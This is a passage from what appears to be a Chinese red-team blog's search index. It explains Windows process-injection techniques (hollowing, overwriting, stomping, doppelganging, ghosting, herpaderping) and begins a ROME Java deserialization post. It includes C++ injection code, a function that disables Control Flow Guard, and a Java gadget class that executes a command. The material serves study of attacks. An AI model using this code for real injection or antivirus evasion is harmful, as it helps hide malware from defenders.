(!pSectionHeaders-&gt;PointerToRawData)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tPVOID pSectionDestination &#x3D; (PVOID)((LPBYTE)pRemoteMem + pSectionHeaders-&gt;VirtualAddress);</span><br><span class=\"line\">\t\tWriteProcessMemory(pi.hProcess, pSectionDestination, (PVOID)((LPBYTE)lpBuffer + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, NULL);</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[*]Writing &quot; &lt;&lt; pSectionHeaders-&gt;Name &lt;&lt; &quot; section to 0x&quot; &lt;&lt; hex &lt;&lt; pSectionDestination &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;将rcx寄存器设置为注入软件的入口点</span><br><span class=\"line\">\tGetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\tctx.Rcx &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F;将eax寄存器设置为注入软件的入口点</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\tctx.Eax &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F;释放本内存中PE痕迹</span><br><span class=\"line\">\tVirtualFree(lpBuffer, 0, MEM_RELEASE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]SetThreadContext&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tSetThreadContext(pi.hThread, &amp;ctx); &#x2F;&#x2F; 设置线程上下文</span><br><span class=\"line\">\tResumeThread(pi.hThread); &#x2F;&#x2F; 恢复挂起线程</span><br><span class=\"line\">\tCloseHandle(pi.hThread);</span><br><span class=\"line\">\tCloseHandle(pi.hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>x64效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722877303330.png\" alt=\"QQ_1722877303330\"></p>\n<p>内存分布：直接在默认0x1400000处开辟Private类型内存，Image映射内存在下面，没截到。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721571196739.png\" alt=\"QQ_1721571196739\"></p>\n<h2 id=\"通用实现代码\"><a href=\"#通用实现代码\" class=\"headerlink\" title=\"通用实现代码\"></a>通用实现代码</h2><p>该项目实现了四种情况的注入，<a href=\"https://github.com/adamhlt/Process-Hollowing\">https://github.com/adamhlt/Process-Hollowing</a> </p>\n<ul>\n<li>x86 有reloc</li>\n<li>x86 无reloc</li>\n<li>x64 有reloc</li>\n<li>x64 无reloc</li>\n</ul>\n<h1 id=\"Process-Overwriting\"><a href=\"#Process-Overwriting\" class=\"headerlink\" title=\"Process Overwriting*\"></a>Process Overwriting*</h1><p>来讨论一下Process Hollowing的缺点，那就是在内存中显眼的 <strong>MEM_PRIVATE</strong> 内存，为了更好的隐藏特征，提出了该方法。</p>\n<p>此处为  <strong>Process Hollowing 和 Module Overloading</strong> 的综合体，<strong>当PE被加载到内存时初始为Image内存类型，直接将该部分内存空间覆写为注入的PE，这样避免了Private内存的出现</strong></p>\n<p>流程如下：</p>\n<ul>\n<li>CreateProcess 创建一个挂起的合法进程</li>\n<li>VirtualProtectEx 更改Image类型内存属性以便写入</li>\n<li>WriteProcessMemory 将PE覆写</li>\n<li>SetThreadContext 设置上下文</li>\n<li>ResumeThread 恢复挂起进程</li>\n</ul>\n<hr>\n<p>CFG概述</p>\n<p>在学习Process Overwriting前，先阅读文章：<a href=\"https://www.giantbranch.cn/2019/10/28/CFG%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BB%8B%E7%BB%8D/\">CFG防护机制简单实践与介绍</a>、<a href=\"https://github.com/zzcentury/Exploit-Re/blob/master/History/CFG%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7.md\">CFG原理及绕过技巧.md</a>、<a href=\"https://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf\">https://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf</a> 、<a href=\"https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/%EF%BC%8C%E6%9D%A5%E5%AD%A6%E4%B9%A0%E7%90%86%E8%A7%A3CFG%E6%9C%BA%E5%88%B6%E5%9C%A8%E8%AF%A5%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%BD%B1%E5%93%8D%E3%80%82%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93%E4%B8%BA%EF%BC%9A\">https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/，来学习理解CFG机制在该过程中的影响。简单总结为：</a></p>\n<p>在 <strong>windows10</strong>和 <strong>windows8.1</strong> 中引入了，执行流保护（CFG，Control Flow Guard）通过 <strong>在间接跳转前插入校验代码</strong>，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时并有效的进行异常处理，避免引发相关的安全问题。</p>\n<blockquote>\n<p>在编译时启用CFG的模块，编译器会分析出该模块中所有间接函数调用 <strong>可达的目标地址</strong>，并将这一信息保存在Guard CF Function Table中，编译器还会在所有<strong>间接函数调用之前插入一段校验代码</strong>，然后根据其Guard CF Function Table来更新 <strong>CFG Bitmap</strong> 中该模块所对应的位。<strong>调用函数时从CFG Bitmap中取出目标地址所对应的位，根据该位是否设置来判断目标地址是否有效</strong>。若目标地址有效，则该函数返回进而执行间接函数调用；否则，该函数将抛出异常而终止当前进程</p>\n</blockquote>\n<p>对比如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722788802901.png\" alt=\"QQ_1722788802901\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722788832398.png\" alt=\"QQ_1722788832398\"></p>\n<p>另外：<strong>VirtualAlloc系列API函数开辟的Private可执行的内存空间在CFG位图中都被认定是有效的执行目标</strong>，不受影响。<a href=\"https://bbs.kanxue.com/thread-277740.htm\">利用CFG寻找潜在的ShellCode内存</a></p>\n<hr>\n<p>对于保护机制的检查可以使用 winchecksec 进行查看，可见svchost.exe的CFG为开启状态</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818230805542.png\" alt=\"image-20240818230805542\"></p>\n<p>这里简单测试没有开启CFG的 <code>C:\\\\windows\\\\System32\\\\RtkAudUService64.exe</code> 来进行测试代码，将PE从基址完整覆写</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818231025628.png\" alt=\"image-20240818231025628\"></p>\n<p>成功注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818230526280.png\" alt=\"image-20240818230526280\"></p>\n<p>既然CFG是通过编译器在函数执行前进行检查，我们直接将未开启CFG的恶意可执行文件覆写这部分内存，那么推测接下来的过程不会触发任何CFG检测。但是结果是触发了CFG，导致程序退出。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818232843561.png\" alt=\"image-20240818232843561\"></p>\n<p>x64dbg调试，三个主要的点 <code>rtluserthreadstart -&gt; BaseThreadInitThunk -&gt; LdrControlFlowGuardEnforced</code>，然后爆出错误</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240819004316994.png\" alt=\"image-20240819004316994\"></p>\n<p>但是具体原因需要仔细研究调试，目前不知道。</p>\n<hr>\n<p>CFG的绕过</p>\n<p>目前可以利用 <strong>SetProcessValidCallTargets</strong> 和 <strong>InitializeProcThreadAttributeList</strong> 和 <strong>SetProcessValidCallTargets底层Nt函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">BOOL DisableCfg(PROCESS_INFORMATION pProcessInfo, DWORD victim_size, PVOID victim_base_addr, DWORD cfg_size, PVOID cfg_base) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t_SetProcessValidCallTargets\tpfnSetProcessValidCallTargets &#x3D; NULL;</span><br><span class=\"line\">\tGetFunctionAddressFromDll((PSTR)&quot;kernelbase.dll&quot;,(PSTR)&quot;SetProcessValidCallTargets&quot;,(PVOID*)&amp;pfnSetProcessValidCallTargets);</span><br><span class=\"line\">\tif (pfnSetProcessValidCallTargets &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">\t\treturn FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfor (unsigned long long i &#x3D; 0; (i + 15) &lt; victim_size; i +&#x3D; 16) &#123;</span><br><span class=\"line\">\t\tCFG_CALL_TARGET_INFO tCfgCallTargetInfo &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\t\ttCfgCallTargetInfo.Flags &#x3D; 0x00000001;</span><br><span class=\"line\">\t\ttCfgCallTargetInfo.Offset &#x3D; (ULONG_PTR)cfg_base - (ULONG_PTR)victim_base_addr + (ULONG_PTR)i;</span><br><span class=\"line\">\t\tpfnSetProcessValidCallTargets(pProcessInfo.hProcess, victim_base_addr, (size_t)victim_size, (ULONG)1, &amp;tCfgCallTargetInfo);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1724140519399.png\" alt=\"QQ_1724140519399\"></p>\n<p><strong>过程中一些问题：</strong></p>\n<p>Q：将一个无CFG的恶意PE覆写后，再执行，为什么还是会受到CFG的影响呢？</p>\n<p>A：<strong>可能CFG还对某些API函数进行检查</strong>，但是这其中的过程还需要后续深入学习</p>\n<p>Q：为什么前面两种对svchost.exe的hollowing方法都没有触发CFG呢？</p>\n<p>A：正同上面提到的，<strong>VirtualAlloc开辟的空间都被认为是有效的，不受CFG影响</strong>。</p>\n<p>参考：</p>\n<p><a href=\"https://insinuator.net/2022/09/some-experiments-with-process-hollowing/\">https://insinuator.net/2022/09/some-experiments-with-process-hollowing/</a> </p>\n<p><a href=\"https://github.com/f-block/Process-Hollowing\">https://github.com/f-block/Process-Hollowing</a></p>\n<p><a href=\"https://github.com/hasherezade/process_overwriting\">https://github.com/hasherezade/process_overwriting</a></p>\n<p><a href=\"https://www.4hou.com/posts/8Yzm\">利用直接 SYSCALL 调用禁用 Control Flow Guard，绕过终端防护软件的检测</a></p>\n<h1 id=\"Process-Stomping\"><a href=\"#Process-Stomping\" class=\"headerlink\" title=\"Process Stomping*\"></a>Process Stomping*</h1><p>该变体通过寻找 <strong>自带有RWX权限section的PE</strong>，将shellcode写入该区域，避免使用了 <strong>内存分配</strong> 和 <strong>VirtualprotectEx</strong>，进一步减少敏感函数操作，使得在内存中更加隐秘，此技术基于 <strong>Process Mockingjay</strong> ，原理请见：<a href=\"https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution\">Process Mockingjay</a></p>\n<p>流程如下：</p>\n<ul>\n<li>CreateProcess 创建一个挂起的合法进程</li>\n<li>WriteProcessMemory 将shellcode写到RWX的section</li>\n<li>SetThreadContext 设置上下文</li>\n<li>ResumeThread 恢复挂起进程</li>\n</ul>\n<p>为了搜索符合条件的PE，我创建了一个小工具：<a href=\"https://github.com/yongsheng220/rwx-section\">rwx-section: 寻找具有RWX section的PE</a>，用来搜索具有RWX section的PE</p>\n<p>X64：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1723911520533.png\" alt=\"QQ_1723911520533\"></p>\n<p>X86：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1723913537520.png\" alt=\"QQ_1723913537520\"></p>\n<p>一些结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+]D:\\vsstudio\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll</span><br><span class=\"line\">[+]D:\\Typora\\winmm.dll</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\GlassWire.exe</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\ThemidaDemo32_64\\Themida.exe</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\ThemidaDemo32_64\\Themida64.exe</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\ThemidaDemo32_64\\ThemidaSDK\\SecureEngineSDK32.dll</span><br></pre></td></tr></table></figure>\n\n<p>以GlassWire.exe为例，可见其 .themida为RWX权限</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1724145365694.png\" alt=\"QQ_1724145365694\"></p>\n<p>写入该区域</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1724145849284.png\" alt=\"QQ_1724145849284\"></p>\n<p>可以使用 <strong>rip/eip</strong> 执行shellcode，既能执行shellcode又能bypass cfg，这样可以让我们绕过所有 CFG 健全性检查，因为线程不会从 CFG 检查函数启动，而是被迫从我们的 shellcode 地址启动。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ctx.Eip &#x3D; (SIZE_T)(LPBYTE)load_base_shifted;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213032966.png\" alt=\"image-20240831213032966\"></p>\n<p>但是要注入的exe需要有完整的dll环境支持。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213145513.png\" alt=\"image-20240831213145513\"></p>\n<p>如果只有单独的exe，没有所需dll，会在线程初始化RtlUserThreadStart报错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213347716.png\" alt=\"image-20240831213347716\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213407227.png\" alt=\"image-20240831213407227\"></p>\n<p>PS：不太清楚在windows加载器的流程中能否实现只有单个exe也能注入。</p>\n<p>参考：</p>\n<p><a href=\"https://github.com/naksyn/ProcessStomping/\">https://github.com/naksyn/ProcessStomping/</a></p>\n<p><a href=\"https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html\">https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html</a></p>\n<h1 id=\"Process-Doppelganging\"><a href=\"#Process-Doppelganging\" class=\"headerlink\" title=\"Process Doppelganging*\"></a>Process Doppelganging*</h1><p>于2017年BlackHat2017提出的的一种新的注入手法。同Process Overwriting也是解决内存中Private属性</p>\n<p>PPT：<a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\">eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf</a></p>\n<p>视频：<a href=\"https://www.youtube.com/watch?v=XmWOj-cfixs\">https://www.youtube.com/watch?v=XmWOj-cfixs</a></p>\n<p>项目：<a href=\"https://github.com/hasherezade/process_doppelganging\">https://github.com/hasherezade/process_doppelganging</a></p>\n<p>首先提出 Process Hollowing 以及变体手法 的不足</p>\n<ul>\n<li>通过unmap 和 VirtualAllocEx：unmap高危操作，VirtualAllocEx开辟的内存不为Image</li>\n<li>不使用unmap而直接覆写：覆写地址的页属性不是共享的</li>\n<li>unmap后再remap为非Image属性：内存属性不为Image</li>\n<li>unmap后再remap为Image属性：由于Process Hollowing更改了入口点，可以通过 <code>ETHREAD.Win32StartAddress != Image.AddressOfEntryPoint</code> 检测，同时remap创建section需要文件落地。</li>\n</ul>\n<blockquote>\n<p><code>ETHREAD.Win32StartAddress</code> 是 Windows 内核中的一个字段，表示线程在用户模式下的起始地址。它指向线程执行的第一条指令所在的函数（即线程的启动函数）。当一个线程被创建时，它会被分配一个启动函数，该函数的地址会被存储在 <code>Win32StartAddress</code> 中。</p>\n<p><code>Image.AddressOfEntryPoint</code> 指的是一个可执行文件（如 EXE 或 DLL）的入口点地址。这个地址是程序启动时操作系统加载器跳转到的第一个指令位置。在 Windows 可执行文件（PE 格式）中，<code>AddressOfEntryPoint</code> 是可执行文件头中的一个字段，通常表示程序的 <code>main</code> 函数或 <code>WinMain</code> 函数的地址。</p>\n</blockquote>\n<p>Process Doppelganging的基本原理如下：亮点是通过 <strong>利用Windows的 NTFS 事务</strong>，创建一个transaction用于打开一个干净的exe，将恶意代码填充后，利用事务回滚特性恢复到干净exe。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901160455559.png\" alt=\"image-20240901160455559\"></p>\n<p>流程如下：</p>\n<ul>\n<li><p>打开一个正常文件，创建一个transaction(NtCreateTransaction)</p>\n</li>\n<li><p>打开源程序句柄（CreateFileTransacted）</p>\n</li>\n<li><p>向源程序句柄写入shellcode(CreateFile,CreateFileMapping,MapViewOfFile,VirtualAlloc,memcpy,WriteFile)</p>\n</li>\n<li><p>根据此时的文件内容，创建一个section(NtCreateSection)</p>\n</li>\n<li><p>回滚到修改事务之前的状态，抹去一系列更改操作(RollbackTransaction)</p>\n</li>\n<li><p>通过刚刚创建的section，创建进程(NtCreateProcessEx)</p>\n</li>\n<li><p>准备参数到目标进程(跨进程)，我们需要创建新进程的参数，然后将这些参数写入到新进程的PEB中，这是因为新进程需要这些参数来正确地初始化</p>\n</li>\n<li><p>创建初始线程(NtCreateThreadEx)</p>\n</li>\n<li><p>唤醒线程(NtResumeThread)</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903152326145.png\" alt=\"image-20240903152326145\"></p>\n<p>在win10上测试为如下：原因是DF：<a href=\"https://github.com/hasherezade/process_doppelganging/issues/3\">https://github.com/hasherezade/process_doppelganging/issues/3</a></p>\n<blockquote>\n<p><strong>Windows Defender’s minifilter called WdFilter has mitigations against transacted process creation.</strong></p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215747183.png\" alt=\"image-20240901215747183\"></p>\n<p>在win11上测试发现有异常的是，任务管理器中，不显示进程名。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215150595.png\" alt=\"image-20240901215150595\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215032965.png\" alt=\"image-20240901215032965\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215323212.png\" alt=\"image-20240901215323212\"></p>\n<h1 id=\"Transacted-Hollowing\"><a href=\"#Transacted-Hollowing\" class=\"headerlink\" title=\"Transacted Hollowing\"></a>Transacted Hollowing</h1><p>借鉴了 Process Doppelganging 的 事务特性 和 Process Hollowing 启动进程的便捷性，免去创建进程、准备进程参数的复杂过程，同Process Overwriting 也是解决内存中Private属性，项目：<a href=\"https://github.com/hasherezade/transacted_hollowing\">https://github.com/hasherezade/transacted_hollowing</a></p>\n<p>流程如下：</p>\n<ul>\n<li><p>创建NTFS Transaction</p>\n</li>\n<li><p>在TxF中创建文件或者覆写文件，写入payload</p>\n</li>\n<li><p>通过文件句柄创建IMAGE SECTION</p>\n</li>\n<li><p>回滚NTFS Transaction</p>\n</li>\n<li><p>创建挂起的傀儡进程</p>\n</li>\n<li><p>将第三步创建的SECTION映射到傀儡进程中</p>\n</li>\n<li><p>修改傀儡进程PEB的ImageBase</p>\n</li>\n<li><p>修改傀儡进程的OEP</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903144723321.png\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903161453521.png\" alt=\"image-20240903161453521\"></p>\n<h1 id=\"Process-Ghosting\"><a href=\"#Process-Ghosting\" class=\"headerlink\" title=\"Process Ghosting*\"></a>Process Ghosting*</h1><p>一种 <strong>不涉及NTFS</strong> 的全新 “无文件” 手法，通过 <strong>设置删除标志位</strong>，写入payload映射到内存后自动删除，达到 “临时落地”，在此过程中，AV因为标志位的存在无法打开恶意文件进行检测，技术细节参看文章。</p>\n<p>文章：<a href=\"https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack\">https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack</a></p>\n<p>项目：<a href=\"https://github.com/hasherezade/process_ghosting\">https://github.com/hasherezade/process_ghosting</a></p>\n<p>流程如下：</p>\n<ul>\n<li><p>创建文件</p>\n</li>\n<li><p>设置文件句柄的 <strong>FILE_DISPOSITION_INFORMATION.DeleteFile = TRUE</strong></p>\n</li>\n<li><p>写入payload</p>\n</li>\n<li><p>通过文件句柄创建 IMAGE SECTION</p>\n</li>\n<li><p>关闭文件句柄，删除文件</p>\n</li>\n<li><p>通过Section创建进程，准备参数，写入PEB的ProcessParameters和Environment</p>\n</li>\n<li><p>创建主线程</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903171444583.png\" alt=\"image-20240903171444583\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903172037658.png\" alt=\"image-20240903172037658\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903181301143.png\" alt=\"image-20240903181301143\"></p>\n<h1 id=\"Ghostly-Hollowing\"><a href=\"#Ghostly-Hollowing\" class=\"headerlink\" title=\"Ghostly Hollowing\"></a>Ghostly Hollowing</h1><p>与 Transacted Hollowing 类似，该方法也是为了免去了Process Ghosting创建进程和准备进程参数的复杂过程，项目代码在Transacted Hollowing中</p>\n<h1 id=\"Process-Herpaderping\"><a href=\"#Process-Herpaderping\" class=\"headerlink\" title=\"Process Herpaderping\"></a>Process Herpaderping</h1><p>该方法的原理、实现都和 <code>Ghosting</code>、<code>Doppelganging</code> 类似，项目：<a href=\"https://github.com/jxy-s/herpaderping\">https://github.com/jxy-s/herpaderping</a></p>\n<ul>\n<li>Ghosting 是删除文件</li>\n<li>Doppelganging 是替换文件的内容（不替换文件）</li>\n<li>Herpaderping 是替换文件和文件内容，其结果是反病毒软件检测执行的进程时，其打开的程序文件内容是我们设定的（比如lsass.exe，包括文件签名）</li>\n</ul>\n<p>流程如下：</p>\n<ul>\n<li>打开一个可读可写的文件</li>\n<li>向文件写入payload（calc.exe），创建section</li>\n<li>创建进程A（和Doppelganging一样，使用NtCreateProcessEx）</li>\n<li>向同一个文件写入伪装的程序，比如lsass.exe</li>\n<li>关闭并保存文件为output.exe（文件保存至磁盘，磁盘的内容是lsass.exe）</li>\n<li>准备进程参数，创建线程（这时payload开始执行）</li>\n</ul>\n<h1 id=\"对比表格\"><a href=\"#对比表格\" class=\"headerlink\" title=\"对比表格\"></a>对比表格</h1><p>针对：Hollowing 、Doppelgänging 、Herpaderping 、Ghosting 有如下对比表格，总的来说越来越隐蔽。</p>\n<table>\n<thead>\n<tr>\n<th>Type</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Hollowing</td>\n<td>map -&gt; modify section -&gt; execute</td>\n</tr>\n<tr>\n<td>Doppelgänging</td>\n<td>transact -&gt; write -&gt; map -&gt; rollback -&gt; execute</td>\n</tr>\n<tr>\n<td>Herpaderping</td>\n<td>write -&gt; map -&gt; modify -&gt; execute -&gt; close</td>\n</tr>\n<tr>\n<td>Ghosting</td>\n<td>delete pending -&gt; write -&gt; map -&gt; close(delete) -&gt; execute</td>\n</tr>\n</tbody></table>\n<h1 id=\"不常见的进程注入\"><a href=\"#不常见的进程注入\" class=\"headerlink\" title=\"不常见的进程注入\"></a>不常见的进程注入</h1><p>额外窗口内存注入，总体来说利用不稳定，在win10测试没有成功，就不再记录了，</p>\n<p><a href=\"https://www.crowdstrike.com/blog/through-window-creative-code-invocation/\">https://www.crowdstrike.com/blog/through-window-creative-code-invocation/</a></p>\n<p><a href=\"https://modexp.wordpress.com/2018/08/26/process-injection-ctray/\">https://modexp.wordpress.com/2018/08/26/process-injection-ctray/</a> </p>\n<p><a href=\"https://bbs.kanxue.com/thread-261451.htm\">Windows不太常见的进程注入学习小记（一）</a></p>\n<p><a href=\"https://bbs.kanxue.com/thread-261553.htm\">Windows不太常见的进程注入学习小记（二）</a></p>\n<p>利用blockdlls和ACG保护恶意进程</p>\n<p><a href=\"https://www.cnblogs.com/zha0gongz1/p/15391205.html\">玄 - 利用blockdlls和ACG保护恶意进程 - zha0gongz1 - 博客园 (cnblogs.com)</a></p>\n<p>Code injection series</p>\n<p><a href=\"https://blog.sevagas.com/?-Code-injection-series-&amp;lang=en\">https://blog.sevagas.com/?-Code-injection-series-&amp;lang=en</a></p>\n","categories":["Red-Team"]},{"title":"ROME反序列化","url":"/2023/12/25/ROME/","content":"<h1 id=\"Rome\"><a href=\"#Rome\" class=\"headerlink\" title=\"Rome\"></a>Rome</h1><p>Rome 就是为 RSS聚合开发的框架， 可以提供RSS阅读和发布器。</p>\n<p>Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作</p>\n<a id=\"more\"></a>\n\n<h1 id=\"Calc\"><a href=\"#Calc\" class=\"headerlink\" title=\"Calc\"></a>Calc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> bytecode;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Calc</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Calc</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException ignored) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"toString触发\"><a href=\"#toString触发\" class=\"headerlink\" title=\"toString触发\"></a>toString触发</h1><p>看一下构造方法，两个可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/rome/498164a8704a88f56afec0d2087368d3.png\" 